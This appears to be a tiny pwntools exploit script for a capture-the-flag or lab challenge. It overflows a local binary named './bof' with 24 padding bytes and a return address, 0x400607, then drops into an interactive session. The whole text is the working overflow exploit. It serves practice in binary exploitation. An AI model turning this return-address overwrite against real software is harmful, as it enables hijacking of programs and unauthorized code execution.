from pwn import *

r = process('./bof')
r.recvline()

p = 'a' * 24 + p64(0x400607)

print p
r.send(p)

r.interactive()
